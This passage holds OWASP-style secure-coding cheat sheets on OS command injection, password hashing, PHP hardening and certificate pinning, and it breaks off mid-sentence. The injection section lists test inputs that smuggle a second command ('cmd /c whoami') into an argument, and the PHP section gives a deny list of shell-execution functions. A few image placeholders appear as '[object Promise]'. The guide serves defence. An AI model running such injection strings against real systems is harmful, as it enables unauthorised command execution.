\"utf-8\"));\r\nSystem.out.printf(\"ERROR :\\n%s\\n\", IOUtils.toString(p.getErrorStream(),\r\n                  \"utf-8\"));\r\n```\r\n\r\n*Result of the test:*\r\n\r\n```text\r\n##### TEST CMD: java -version & cmd /c whoami\r\nRC    : 0\r\nOUT   :\r\n\r\nERROR :\r\njava version \"1.8.0_31\"\r\n\r\n##### TEST CMD: java -version && cmd /c whoami\r\nRC    : 0\r\nOUT   :\r\n\r\nERROR :\r\njava version \"1.8.0_31\"\r\n\r\n##### TEST CMD: java -version | cmd /c whoami\r\nRC    : 0\r\nOUT   :\r\n\r\nERROR :\r\njava version \"1.8.0_31\"\r\n\r\n##### TEST CMD: java -version || cmd /c whoami\r\nRC    : 0\r\nOUT   :\r\n\r\nERROR :\r\njava version \"1.8.0_31\"\r\n\r\n##### TEST PAYLOAD ONLY: cmd /c whoami\r\nRC    : 0\r\nOUT   :\r\nmydomain\\simpleuser\r\n\r\nERROR :\r\n```\r\n\r\n*Incorrect usage:*\r\n\r\n```java\r\nProcessBuilder b = new ProcessBuilder(\"C:\\DoStuff.exe -arg1 -arg2\");\r\n```\r\n\r\nIn this example, the command together with the arguments are passed as a one string, making it easy to manipulate that expression and inject malicious strings.\r\n\r\n*Correct Usage:*\r\n\r\nHere is an example that starts a process with a modified working directory. The command and each of the arguments are passed separately. This makes it easy to validate each term and reduces the risk of malicious strings being inserted.\r\n\r\n``` java\r\nProcessBuilder pb = new ProcessBuilder(\"TrustedCmd\", \"TrustedArg1\", \"TrustedArg2\");\r\n\r\nMap<String, String> env = pb.environment();\r\n\r\npb.directory(new File(\"TrustedDir\"));\r\n\r\nProcess p = pb.start();\r\n```\r\n\r\n### .Net\r\n\r\nSee relevant details in the [DotNet Security Cheat Sheet](DotNet_Security_Cheat_Sheet.md#os-injection)\r\n\r\n### PHP\r\n\r\nIn PHP use [escapeshellarg()](https://www.php.net/manual/en/function.escapeshellarg.php) or [escapeshellcmd()](https://www.php.net/manual/en/function.escapeshellcmd.php) rather than [exec()](https://www.php.net/manual/en/function.exec.php), [system()](https://www.php.net/manual/en/function.system.php), [passthru()](https://www.php.net/manual/en/function.passthru.php).\r\n\r\n## Related articles\r\n\r\n### Description of Command Injection Vulnerability\r\n\r\n- OWASP [Command Injection](https://owasp.org/www-community/attacks/Command_Injection).\r\n\r\n### How to Avoid Vulnerabilities\r\n\r\n- C Coding: [Do not call system()](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=87152177).\r\n\r\n### How to Review Code\r\n\r\n- OWASP [Reviewing Code for OS Injection](https://wiki.owasp.org/index.php/Reviewing_Code_for_OS_Injection).\r\n\r\n### How to Test\r\n\r\n- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) article on [Testing for Command Injection](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection.html).\r\n\r\n### External References\r\n\r\n- [CWE Entry 77 on Command Injection](https://cwe.mitre.org/data/definitions/77.html).\r\n"
    },
    {
      "Password_Storage_Cheat_Sheet.md": "# Password Storage Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThis cheat sheet advises you on the proper methods for storing passwords for authentication. When passwords are stored, they must be protected from an attacker even if the application or database is compromised. Fortunately, a majority of modern languages and frameworks provide built-in functionality to help store passwords safely.\r\n\r\nHowever, once an attacker has acquired stored password hashes, they are always able to brute force hashes offline. Defenders can slow down offline attacks by selecting hash algorithms that are as resource intensive as possible.\r\n\r\nTo sum up our recommendations:\r\n\r\n- **Use [Argon2id](#argon2id) with a minimum configuration of 19 MiB of memory, an iteration count of 2, and 1 degree of parallelism.**\r\n- **If [Argon2id](#argon2id) is not available, use [scrypt](#scrypt) with a minimum CPU/memory cost parameter of (2^17), a minimum block size of 8 (1024 bytes), and a parallelization parameter of 1.**\r\n- **For legacy systems using [bcrypt](#bcrypt), use a work factor of 10 or more and with a password limit of 72 bytes.**\r\n- **If FIPS-140 compliance is required, use [PBKDF2](#pbkdf2) with a work factor of 600,000 or more and set with an internal hash function of HMAC-SHA-256.**\r\n- **Consider using a [pepper](#peppering) to provide additional defense in depth (though alone, it provides no additional secure characteristics).**\r\n\r\n## Background\r\n\r\n### Hashing vs Encryption\r\n\r\nHashing and encryption can keep sensitive data safe, but in almost all circumstances, **passwords should be hashed, NOT encrypted.**\r\n\r\nBecause **hashing is a one-way function** (i.e., it is impossible to \"decrypt\" a hash and obtain the original plaintext value), it is the most appropriate approach for password validation. Even if an attacker obtains the hashed password, they cannot use it to log in as the victim.\r\n\r\nSince **encryption is a two-way function**, attackers can retrieve the original plaintext from the encrypted data. It can be used to store data such as a user's address since this data is displayed in plaintext on the user's profile. Hashing their address would result in a garbled mess.\r\n\r\n The only time encryption should be used in passwords is in edge cases where it is necessary to obtain the original plaintext password. This might be necessary if the application needs to use the password to authenticate with another system that does not support a modern way to programmatically grant access, such as OpenID Connect (OIDC). Wherever possible, an alternative architecture should be used to avoid the need to store passwords in an encrypted form.\r\n\r\nFor further guidance on encryption, see the [Cryptographic Storage Cheat Sheet](Cryptographic_Storage_Cheat_Sheet.md).\r\n\r\n### When Password Hashes Can Be Cracked\r\n\r\n**Strong passwords stored with modern hashing algorithms and using hashing best practices should be effectively impossible for an attacker to crack.**  It is your responsibility as an application owner to select a modern hashing algorithm.\r\n\r\nHowever, there are some situations where an attacker can \"crack\" the hashes in some circumstances by doing the following:\r\n\r\n- Selecting a password you think the victim has chosen (e.g.`password1!`)\r\n- Calculating the hash\r\n- Comparing the hash you calculated to the hash of the victim. If they match, you have correctly \"cracked\" the hash and now know the plaintext value of their password.\r\n\r\nUsually, the attacker will repeat this process wth a list of large number of potential candidate passwords, such as:\r\n\r\n- Lists of passwords obtained from other compromised sites\r\n- Brute force (trying every possible candidate)\r\n- Dictionaries or wordlists of common passwords\r\n\r\nWhile the number of permutations can be enormous, with high speed hardware (such as GPUs) and cloud services with many servers for rent, the cost to an attacker is relatively small to do successful password cracking, especially when best practices for hashing are not followed.\r\n\r\n## Methods for Enhancing Password Storage\r\n\r\n### Salting\r\n\r\nA salt is a unique, randomly generated string that is added to each password as part of the hashing process. As the salt is unique for every user, an attacker has to crack hashes one at a time using the respective salt rather than calculating a hash once and comparing it against every stored hash. This makes cracking large numbers of hashes significantly harder, as the time required grows in direct proportion to the number of hashes.\r\n\r\nSalting also protects against an attacker's pre-computing hashes using rainbow tables or database-based lookups. Finally, salting means that it is impossible to determine whether two users have the same password without cracking the hashes, as the different salts will result in different hashes even if the passwords are the same.\r\n\r\n[Modern hashing algorithms](#password-hashing-algorithms) such as Argon2id, bcrypt, and PBKDF2 automatically salt the passwords, so no additional steps are required when using them.\r\n\r\n### Peppering\r\n\r\nA [pepper](https://www.ietf.org/archive/id/draft-ietf-kitten-password-storage-04.html#section-4.2) can be used in addition to salting to provide an additional layer of protection. It prevents an attacker from being able to crack any of the hashes if they only have access to the database, for example, if they have exploited a SQL injection vulnerability or obtained a backup of the database. Peppering strategies do not affect the password hashing function in any way.\r\n\r\nFor example, one peppering strategy is hashing the passwords as usual (using a password hashing algorithm) and then using an HMAC (e.g., HMAC-SHA256, HMAC-SHA512, depending on the desired output length) on the original password hash before storing the password hash in the database, with the pepper acting as the HMAC  key.\r\n\r\n- The pepper is **shared between stored passwords**, rather than being *unique* like a salt.\r\n- Unlike a password salt, the pepper **should not be stored in the database**.\r\n- Peppers are secrets and should be stored in \"secrets vaults\" or HSMs (Hardware Security Modules). See the [Secrets Management Cheat Sheet](Secrets_Management_Cheat_Sheet.md) for more information on securely storing secrets.\r\n- Like any other cryptographic key, a pepper rotation strategy should be considered.\r\n\r\n### Using Work Factors\r\n\r\n The work factor is the number of iterations of the hashing algorithm that are performed for each password (usually, it's actually `2^work` iterations). The work factor is typically stored in the hash output. It makes calculating the hash more computationally expensive, which in turn reduces the speed and/or increases the cost for which an attacker can attempt to crack the password hash.\r\n\r\nWhen you choose a work factor, strike a balance between security and performance. Though higher work factors make hashes more difficult for an attacker to crack, they will slow down the process of verifying a login attempt. If the work factor is too high, the performance of the application may be degraded, which could used by an attacker to carry out a denial of service attack by exhausting the server's CPU with a large number of login attempts.\r\n\r\nThere is no golden rule for the ideal work factor - it will depend on the performance of the server and the number of users on the application. Determining the optimal work factor will require experimentation on the specific server(s) used by the application. As a general rule, calculating a hash should take less than one second.\r\n\r\n#### Upgrading the Work Factor\r\n\r\nOne key advantage of having a work factor is that it can be increased over time as hardware becomes more powerful and cheaper.\r\n\r\nThe most common approach to upgrading the work factor is to wait until the user next authenticates, then re-hash their password with the new work factor. The different hashes will have different work factors and hashes may never be upgraded if the user doesn't log back into the application. Depending on the application, it may be appropriate to remove the older password hashes and require users to reset their passwords next time they need to login in order to avoid storing older and less secure hashes.\r\n\r\n## Password Hashing Algorithms\r\n\r\nSome modern hashing algorithms have been specifically designed to securely store passwords. This means that they should be slow (unlike algorithms such as MD5 and SHA-1, which were designed to be fast), and you can change how slow they are by changing the work factor.\r\n\r\nYou do not need to hide which password hashing algorithm is used by an application. If you utilize a modern password hashing algorithm with proper configuration parameters, it should be safe to state in public which password hashing algorithms are in use and be listed [here](https://pulse.michalspacek.cz/passwords/storages).\r\n\r\nThree hashing algorithms that should be considered:\r\n\r\n### Argon2id\r\n\r\n[Argon2](https://en.wikipedia.org/wiki/Argon2) was the winner of the 2015 [Password Hashing Competition](https://en.wikipedia.org/wiki/Password_Hashing_Competition). Out of the three Argon2 versions, use the  Argon2id variant since it provides a balanced approach to resisting both side-channel and GPU-based attacks.\r\n\r\nRather than a simple work factor like other algorithms, Argon2id has three different parameters that can be configured: the base minimum of the minimum memory size (m), the minimum number of iterations (t), and the degree of parallelism (p). We recommend the following configuration settings:\r\n\r\n- m=47104 (46 MiB), t=1, p=1 (Do not use with Argon2i)\r\n- m=19456 (19 MiB), t=2, p=1 (Do not use with Argon2i)\r\n- m=12288 (12 MiB), t=3, p=1\r\n- m=9216 (9 MiB), t=4, p=1\r\n- m=7168 (7 MiB), t=5, p=1\r\n\r\nThese configuration settings provide an equal level of defense, and the only difference is a trade off between CPU and RAM usage.\r\n\r\n### scrypt\r\n\r\n[scrypt](http://www.tarsnap.com/scrypt/scrypt.pdf) is a password-based key derivation function created by [Colin Percival](https://twitter.com/cperciva). While [Argon2id](#argon2id) should be the best choice for password hashing, [scrypt](#scrypt) should be used when the former is not available.\r\n\r\nLike [Argon2id](#argon2id), scrypt has three different parameters that can be configured: the minimum CPU/memory cost parameter (N), the blocksize (r) and the degree of parallelism (p). Use one of the following settings:\r\n\r\n- N=2^17 (128 MiB), r=8 (1024 bytes), p=1\r\n- N=2^16 (64 MiB), r=8 (1024 bytes), p=2\r\n- N=2^15 (32 MiB), r=8 (1024 bytes), p=3\r\n- N=2^14 (16 MiB), r=8 (1024 bytes), p=5\r\n- N=2^13 (8 MiB), r=8 (1024 bytes), p=10\r\n\r\nThese configuration settings provide an equal level of defense. The only difference is a trade off between CPU and RAM usage.\r\n\r\n### bcrypt\r\n\r\nThe [bcrypt](https://en.wikipedia.org/wiki/bcrypt) password hashing function should be the best choice for password storage in legacy systems or if PBKDF2 is required to achieve FIPS-140 compliance.\r\n\r\nThe work factor should be as large as verification server performance will allow, with a minimum of 10.\r\n\r\n#### Input Limits of bcrypt\r\n\r\nbcrypt has a maximum length input length of 72 bytes [for most implementations](https://security.stackexchange.com/questions/39849/does-bcrypt-have-a-maximum-password-length), so you should enforce a maximum password length of 72 bytes (or less if the bcrypt implementation in use has smaller limits).\r\n\r\n#### Pre-Hashing Passwords with bcrypt\r\n\r\nAn alternative approach is to pre-hash the user-supplied password with a fast algorithm such as SHA-256, and then to hash the resulting hash with bcrypt (i.e., `bcrypt(base64(hmac-sha256(data:$password, key:$pepper)), $salt, $cost)`). This is a dangerous (but common) practice that **should be avoided** due to [password shucking](https://www.youtube.com/watch?v=OQD3qDYMyYQ) and other issues when [combining bcrypt with other hash functions](https://blog.ircmaxell.com/2015/03/security-issue-combining-bcrypt-with.html).\r\n\r\n### PBKDF2\r\n\r\nSince [PBKDF2](https://en.wikipedia.org/wiki/PBKDF2) is recommended by [NIST](https://pages.nist.gov/800-63-3/sp800-63b.html#memsecretver) and has FIPS-140 validated implementations, so it should be the preferred algorithm when these are required.\r\n\r\nThe PBKDF2 algorithm requires that you select an internal hashing algorithm such as an HMAC or a variety of other hashing algorithms. HMAC-SHA-256 is widely supported and is recommended by NIST.\r\n\r\nThe work factor for PBKDF2 is implemented through an iteration count, which should set differently based on the internal hashing algorithm used.\r\n\r\n- PBKDF2-HMAC-SHA1: 1,300,000 iterations\r\n- PBKDF2-HMAC-SHA256: 600,000 iterations\r\n- PBKDF2-HMAC-SHA512: 210,000 iterations\r\n\r\n### Parallel PBKDF2\r\n\r\n- PPBKDF2-SHA512: cost 2\r\n- PPBKDF2-SHA256: cost 5\r\n- PPBKDF2-SHA1: cost 10\r\n\r\nThese configuration settings are equivalent in the defense they provide. ([Number as of december 2022, based on testing of RTX 4000 GPUs](https://tobtu.com/minimum-password-settings/))\r\n\r\n#### PBKDF2 Pre-Hashing\r\n\r\nWhen PBKDF2 is used with an HMAC, and the password is longer than the hash function's block size (64 bytes for SHA-256), the password will be automatically pre-hashed. For example, the password \"This is a password longer than 512 bits which is the block size of SHA-256\" is converted to the hash value (in hex): `fa91498c139805af73f7ba275cca071e78d78675027000c99a9925e2ec92eedd`.\r\n\r\nGood implementations of PBKDF2 perform pre-hashing before the expensive iterated hashing phase. However, some implementations perform the conversion on each iteration, which can make hashing long passwords significantly more expensive than hashing short passwords. When users supply very long passwords, a potential denial of service vulnerability could occur, such as the one published in [Django](https://www.djangoproject.com/weblog/2013/sep/15/security/) during 2013. Manual pre-hashing can reduce this risk but requires adding a [salt](#salting) to the pre-hash step.\r\n\r\n## Upgrading Legacy Hashes\r\n\r\nOlder applications that use less secure hashing algorithms, such as MD5 or SHA-1, can be upgraded to modern password hashing algorithms as described above. When the users enter their password (usually by authenticating on the application), that input should be re-hashed using the new algorithm. Defenders should expire the users' current password and require them to enter a new one, so that any older (less secure) hashes of their password are no longer useful to an attacker.\r\n\r\nHowever, this means that old (less secure) password hashes will be stored in the database until the user logs in. You can take one of two approaches to avoid this dilemma.\r\n\r\nUpgrade Method One: Expire and delete the password hashes of users who have been inactive for an extended period and require them to reset their passwords to login again. Although secure, this approach is not particularly user-friendly. Expiring the passwords of many users may cause issues for support staff or may be interpreted by users as an indication of a breach.\r\n\r\nUpgrade Method Two: Use the existing password hashes as inputs for a more secure algorithm. For example, if the application originally stored passwords as `md5($password)`, this could be easily upgraded to `bcrypt(md5($password))`. Layering the hashes avoids the need to know the original password; however, it can make the hashes easier to crack. These hashes should be replaced with direct hashes of the users' passwords next time the user logs in.\r\n\r\nRemember that once your password hashing method is selected, it will have to be upgraded in the future, so ensure that upgrading your hashing algorithm is as easy as possible. During the transition period, allow for a mix of old and new hashing algorithms. Using a mix of hashing algorithms is easier if the password hashing algorithm and work factor are stored with the password using a standard format, for example, the [modular PHC string format](https://github.com/P-H-C/phc-string-format/blob/master/phc-sf-spec.md).\r\n\r\n### International Characters\r\n\r\nYour hashing library must be able to accept a wide range of characters and should be compatible with all Unicode codepoints, so users can use the full range of characters available on modern devices - especially mobile keyboards. They should be able to select passwords from various languages and include pictograms. Prior to hashing the entropy of the user's entry should not be reduced, and password hashing libraries need to be able to use input that may contain a NULL byte.\r\n"
    },
    {
      "PHP_Configuration_Cheat_Sheet.md": "# PHP Configuration Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThis page is meant to help those configuring PHP and the web server it is running on to be very secure.\r\n\r\nBelow you will find information on the proper settings for the `php.ini` file and instructions on configuring Apache, Nginx, and Caddy web servers.\r\n\r\nFor general PHP codebase security please refer to the two following great guides:\r\n\r\n- [Paragonie's 2018 PHP Security Guide](https://paragonie.com/blog/2017/12/2018-guide-building-secure-php-software)\r\n- [Awesome PHP Security](https://github.com/guardrailsio/awesome-php-security)\r\n\r\n## PHP Configuration and Deployment\r\n\r\n### php.ini\r\n\r\nSome of following settings need to be adapted to your system, in particular `session.save_path`, `session.cookie_path` (e.g. `/var/www/mysite`), and `session.cookie_domain` (e.g. `ExampleSite.com`).\r\n\r\nYou should also be running PHP 7.2 or later. If running PHP 7.0 and 7.1, you will use slightly different values in a couple of places below (see inline comments). Finally look through the [PHP Manual](https://www.php.net/manual/ini.core.php) for a complete reference on every value in the php.ini configuration file.\r\n\r\nYou can find a copy of the following values in a ready-to-go php.ini file [here](https://github.com/danehrlich1/very-secure-php-ini).\r\n\r\n#### PHP error handling\r\n\r\n```text\r\nexpose_php              = Off\r\nerror_reporting         = E_ALL\r\ndisplay_errors          = Off\r\ndisplay_startup_errors  = Off\r\nlog_errors              = On\r\nerror_log               = /valid_path/PHP-logs/php_error.log\r\nignore_repeated_errors  = Off\r\n```\r\n\r\nKeep in mind that you need to have `display_errors` to `Off` on a production server and it's a good idea to frequently notice the logs.\r\n\r\n#### PHP general settings\r\n\r\n```text\r\ndoc_root                = /path/DocumentRoot/PHP-scripts/\r\nopen_basedir            = /path/DocumentRoot/PHP-scripts/\r\ninclude_path            = /path/PHP-pear/\r\nextension_dir           = /path/PHP-extensions/\r\nmime_magic.magicfile    = /path/PHP-magic.mime\r\nallow_url_fopen         = Off\r\nallow_url_include       = Off\r\nvariables_order         = \"GPCS\"\r\nallow_webdav_methods    = Off\r\nsession.gc_maxlifetime  = 600\r\n```\r\n\r\n`allow_url_*` prevents [LFI](https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/)s to be easily escalated to [RFI](https://www.acunetix.com/blog/articles/remote-file-inclusion-rfi/)s.\r\n\r\n#### PHP file upload handling\r\n\r\n```text\r\nfile_uploads            = On\r\nupload_tmp_dir          = /path/PHP-uploads/\r\nupload_max_filesize     = 2M\r\nmax_file_uploads        = 2\r\n```\r\n\r\nIf your application is not using file uploads, and say the only data the user will enter / upload is forms that do not require any document attachments, `file_uploads` should be turned `Off`.\r\n\r\n#### PHP executable handling\r\n\r\n```text\r\nenable_dl               = Off\r\ndisable_functions       = system, exec, shell_exec, passthru, phpinfo, show_source, highlight_file, popen, proc_open, fopen_with_path, dbmopen, dbase_open, putenv, move_uploaded_file, chdir, mkdir, rmdir, chmod, rename, filepro, filepro_rowcount, filepro_retrieve, posix_mkfifo\r\n# see also: http://ir.php.net/features.safe-mode\r\ndisable_classes         =\r\n```\r\n\r\nThese are dangerous PHP functions. You should disable all that you don't use.\r\n\r\n#### PHP session handling\r\n\r\nSession settings are some of the MOST important values to concentrate on in configuring. It is a good practice to change `session.name` to something new.\r\n\r\n```text\r\n session.save_path                = /path/PHP-session/\r\n session.name                     = myPHPSESSID\r\n session.auto_start               = Off\r\n session.use_trans_sid            = 0\r\n session.cookie_domain            = full.qualified.domain.name\r\n #session.cookie_path             = /application/path/\r\n session.use_strict_mode          = 1\r\n session.use_cookies              = 1\r\n session.use_only_cookies         = 1\r\n session.cookie_lifetime          = 14400 # 4 hours\r\n session.cookie_secure            = 1\r\n session.cookie_httponly          = 1\r\n session.cookie_samesite          = Strict\r\n session.cache_expire             = 30\r\n session.sid_length               = 256\r\n session.sid_bits_per_character   = 6 # PHP 7.2+\r\n session.hash_function            = 1 # PHP 7.0-7.1\r\n session.hash_bits_per_character  = 6 # PHP 7.0-7.1\r\n```\r\n\r\n#### Some more security paranoid checks\r\n\r\n```text\r\nsession.referer_check   = /application/path\r\nmemory_limit            = 50M\r\npost_max_size           = 20M\r\nmax_execution_time      = 60\r\nreport_memleaks         = On\r\ntrack_errors            = Off\r\nhtml_errors             = Off\r\n```\r\n\r\n### Suhosin\r\n\r\n[Suhosin](https://www.hardened-php.net/suhosin/index.html) is a patch to PHP which provides a number of hardening and security features that are not available in the default PHP build. However, Suhosin only works with PHP 5, which is **unsupported** and **should not be used**.\r\n\r\nFor PHP 7, there is [Suhosin-ng](https://github.com/sektioneins/suhosin-ng/wiki/News), but it's in a prerelease stage, and as such **should not be used in production**.\r\n\r\n### Snuffleupagus\r\n\r\n[Snuffleupagus](https://snuffleupagus.readthedocs.io) is the spiritual\r\ndescendent of Suhosin for PHP 7 and onwards, with [modern\r\nfeatures](https://snuffleupagus.readthedocs.io/features.html). It's considered\r\nstable, and is usable in production.\r\n"
    },
    {
      "Pinning_Cheat_Sheet.md": "# Pinning Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThe Pinning Cheat Sheet is a technical guide to implementing certificate and public key pinning as discussed at the Virginia chapter's presentation [Securing Wireless Channels in the Mobile Space](https://wiki.owasp.org/images/8/8f/Securing-Wireless-Channels-in-the-Mobile-Space.ppt). This guide is focused on providing clear, simple, actionable guidance for securing the channel in a hostile environment where actors could be malicious and the conference of trust a liability.\r\n\r\n## What's the problem\r\n\r\nUsers, developers, and applications expect end-to-end security on their secure channels, but some secure channels are not meeting the expectation. Specifically, channels built using well known protocols such as VPN, SSL, and TLS can be vulnerable to a number of attacks.\r\n\r\n## What Is Pinning\r\n\r\nPinning is the process of associating a host with their *expected* X509 certificate or public key. Once a certificate or public key is known or seen for a host, the certificate or public key is associated or 'pinned' to the host. If more than one certificate or public key is acceptable, then the program holds a *pinset* (taking from [Jon Larimer and Kenny Root Google I/O talk](https://developers.google.com/events/io/sessions/gooio2012/107/)). In this case, the advertised identity must match one of the elements in the pinset.\r\n\r\n### When to Add a Pin\r\n\r\nA host or service's certificate or public key can be added to an application at development time, or it can be added upon first encountering the certificate or public key. The former - adding at development time - is preferred since *preloading* the certificate or public key *out of band* usually means the attacker cannot taint the pin.\r\n\r\n### When Do You Perform Pinning\r\n\r\nYou should pin anytime you want to be relatively certain of the remote host's identity or when operating in a hostile environment. Since one or both are almost always true, you should probably pin all the time.\r\n\r\n### When Do You Not Pin?\r\n\r\nPinning requires control of upcoming certificate attributes. If the certificate key pair cannot be predicted in advance before it is put into service, then pinning will lead to an outage when the endpoint presents a new certificate. For instance, if a certificate provider generates random key pairs whenever a certificate is rotated, and you cannot control when this certificate is put into use, then you will not be able to update your clients until they have already experienced an outage.\r\n\r\n### When to Apply Exceptions\r\n\r\nIf you are working for an organization which practices \"egress filtering\" as part of a Data Loss Prevention (DLP) strategy, you will likely encounter *Interception Proxies*. I like to refer to these things as **\"good\" bad actors** (as opposed to **\"bad\" bad actors**) since both break end-to-end security and we can't tell them apart. In this case, **do not** offer to allow-list the interception proxy since it defeats your security goals. Add the interception proxy's public key to your pinset after being **instructed** to do so by the folks in Risk Acceptance.\r\n\r\n### How Do You Pin\r\n\r\nThe idea is to re-use the exiting protocols and infrastructure, but use them in a hardened manner. For re-use, a program would keep doing the things it used to do when establishing a secure connection.\r\n\r\nTo harden the channel, the program would take advantage of the `OnConnect` callback offered by a library, framework or platform. In the callback, the program would verify the remote host's identity by validating its certificate or public key. See [some examples](#examples-of-pinning) below.\r\n\r\n### What Should Be Pinned\r\n\r\nIn order to decide what should be pinned you can follow the following steps.\r\n\r\n1. Decide if you want to pin the root CA, intermediate CA or leaf certificate:\r\n\r\n    - Pinning the **root CA** is generally not recommended since it highly increases the risk because it implies also trusting all its intermediate CAs.\r\n    - Pinning a specific **intermediate CA** reduces the risk but the application will be also trusting any other certificates issues by that CA, not only the ones meant for your application.\r\n    - Pinning a **leaf certificate** is recommended but must include backup (e.g. intermediate CA). It provides 100% certainty that the app exclusively trusts the remote hosts it was designed to connect to.\r\n\r\n    For example, the application pins the remote endpoint leaf certificate but includes a backup pin for the intermediate CA. This increases the risk by trusting more certificate authorities but decreases the chances of bricking your app. If there's any issue with the leaf certificate, the app can always fall back to the intermediate CA until you release an app update.\r\n\r\n2. Choose if you want to pin the **whole certificate** or just its **public key**.\r\n\r\n3. If you chose the public key, you have two additional choices:\r\n\r\n- Pin the `subjectPublicKeyInfo`.\r\n- Pin one of the concrete types such as `RSAPublicKey` or `DSAPublicKey`.\r\n\r\n**subjectPublicKeyInfo**:\r\n\r\n[object Promise]\r\n\r\nThe three choices are explained below in more detail. I would encourage you to pin the `subjectPublicKeyInfo` because it has the public parameters (such as `{e,n}` for an RSA public key) **and** contextual information such as an algorithm and OID. The context will help you keep your bearings at times, and the figure to the right shows the additional information available.\r\n\r\n#### Certificate\r\n\r\n[object Promise]\r\n\r\nThe certificate is easiest to pin. You can fetch the certificate out of band for the website, have the IT folks email your company certificate to you, use `openssl s_client` to retrieve the certificate etc. At runtime, you retrieve the website or server's certificate in the callback. Within the callback, you compare the retrieved certificate with the certificate embedded within the program. If the comparison fails, then fail the method or function.\r\n\r\n**Benefits:**\r\n\r\n- It might be easier to implement than the other methods, especially in languages such as Cocoa/CocoaTouch and OpenSSL.\r\n\r\n**Downsides:**\r\n\r\n- If the site rotates its certificate on a regular basis, then your application would need to be updated regularly. If you do not control when this certificate is put into service, then pinning will lead to an outage.\r\n\r\n#### Public Key\r\n\r\n[object Promise]\r\n\r\nPublic key pinning is more flexible but a little trickier due to the extra steps necessary to extract the public key from a certificate. As with a certificate, the program checks the extracted public key with its embedded copy of the public key.\r\n\r\n**Benefits:**\r\n\r\n- It allows access to public key parameters (such as `{e,n}` for an RSA public key) and contextual information such as an algorithm and OID.\r\n- It's more flexible than certificate pinning. Even if the server rotates its certificates, the underlying public keys (within the certificate) remain static.\r\n\r\n**Downsides:**\r\n\r\n- It's harder to work with keys (versus certificates) since you must extract the key from the certificate. Extraction is a minor inconvenience in Java and .Net, but it's uncomfortable in Cocoa/CocoaTouch and OpenSSL.\r\n- The key is static and may violate key rotation policies.\r\n- Some service providers generate new keys upon renewal.\r\n- It's not possible to anonymize the public keys.\r\n\r\n#### Hash\r\n\r\nWhile the three choices above used DER encoding, its also acceptable to use a hash of the information. In fact, the original sample programs were written using digested certificates and public keys. The samples were changed to allow a programmer to inspect the objects with tools like `dumpasn1` and other ASN.1 decoders.\r\n\r\n**Benefits:**\r\n\r\n- It's convenient to use. A digested certificate fingerprint is often available as a native API for many libraries.\r\n- Hashing allows you to anonymize a certificate or public key. This might be important if you application is concerned about leaking information during decompilation and re-engineering.\r\n- An organization might want to supply a reserve (or back-up) identity in case the primary identity is compromised. Hashing ensures your adversaries do not see the reserved certificate or public key in advance of its use. In fact, Google's IETF draft *websec-key-pinning* uses the technique.\r\n\r\n**Downsides:**\r\n\r\n- No access to public key parameters nor contextual information such as an algorithm and OID which might be needed in certain use cases.\r\n- If the site rotates its certificate on a regular basis, then your application would need to be updated regularly. If you do not control when this certificate is put into service, then pinning would lead to an outage.\r\n\r\n## Examples of Pinning\r\n\r\nThis section discusses certificate and public key pinning in Android Java, iOS, .Net, and OpenSSL. Code has been omitted for brevity, but the key points for the platform are highlighted.\r\n\r\n### Android\r\n\r\nSince Android N, the preferred way for implementing pinning is by leveraging Android's [Network Security Configuration](https://developer.android.com/training/articles/security-config.html) feature, which lets apps customize their network security settings in a safe, declarative configuration file without modifying app code.\r\n\r\nTo enable pinning, [the `<pin-set>` configuration setting](https://developer.android.com/training/articles/security-config.html#CertificatePinning) can be used.\r\n\r\nIf devices running a version of Android that is earlier than N need to be supported, a backport of the Network Security Configuration pinning functionality is available via the [TrustKit Android library](https://github.com/datatheorem/TrustKit-Android).\r\n\r\nAlternatively you can use methods such as the pinning from OkHTTP in order to set specific pins programmatically, as explained in the [OWASP Mobile Security Testing Guide (MSTG)](https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05g-Testing-Network-Communication.md#network-libraries-and-webviews) and [the OKHttp documentation](https://square.github.io/okhttp/3.x/okhttp/okhttp3/CertificatePinner.html).\r\n\r\nThe Android documentation provides an example of how SSL validation can be customized within the app's code (in order to implement pinning) in the [Unknown CA implementation document](https://developer.android.com/training/articles/security-ssl.html#UnknownCa). However, implementing pinning validation from scratch should be avoided, as implementation mistakes are extremely likely and usually lead to severe vulnerabilities.\r\n\r\nLastly, if you want to validate whether the pinning is successful, please follow instructions from the [introduction into testing network communication](https://github.com/OWASP/owasp-mstg/blob/master/Document/0x04f-Testing-Network-Communication.md#testing-network-communication) and the [Android specific network testing](https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05g-Testing-Network-Communication.md) chapters of the OWASP Mobile Security Testing Guide (MSTG).\r\n\r\n### iOS\r\n\r\nApple suggests pinning a CA public key by specifying it in `Info.plist` file under [App Transport Security Settings](https://developer.apple.com/documentation/security/preventing_insecure_network_connections). More details in the article [\"Identity Pinning: How to configure server certificates for your app\"](https://developer.apple.com/news/?id=g9ejcf8y).\r\n\r\n[TrustKit](https://github.com/datatheorem/TrustKit), an open-source SSL pinning library for iOS and macOS is available. It provides an easy-to-use API for implementing pinning, and has been deployed in many apps.\r\n\r\nOtherwise, more details regarding how SSL validation can be customized on iOS (in order to implement pinning) are available in the [HTTPS Server Trust Evaluation](https://developer.apple.com/library/content/technotes/tn2232/_index.html) technical note. However, implementing pinning validation from scratch should be avoided, as implementation mistakes are extremely likely and usually lead to severe vulnerabilities.\r\n\r\nLastly, if you want to validate whether the pinning is successful, please follow instructions from the [introduction into testing network communication](https://github.com/OWASP/owasp-mstg/blob/master/Document/0x04f-Testing-Network-Communication.md#testing-network-communication) and the [iOS specific network testing](https://github.com/OWASP/owasp-mstg/blob/master/Document/0x06g-Testing-Network-Communication.md) chapters of the OWASP Mobile Security Testing Guide (MSTG).\r\n\r\n### .Net\r\n\r\n.Net pinning can be achieved by using [`ServicePointManager`](https://docs.microsoft.com/en-us/dotnet/api/system.net.servicepointmanager?view=netframework-4.7.2). An example can be found at the [OWASP MSTG](https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05g-Testing-Network-Communication.md#xamarin-applications).\r\n\r\nDownload the [.Net sample program](../assets/Pinning_Cheat_Sheet_Certificate_DotNetSample.zip).\r\n\r\n### OpenSSL\r\n\r\nPinning can occur at one 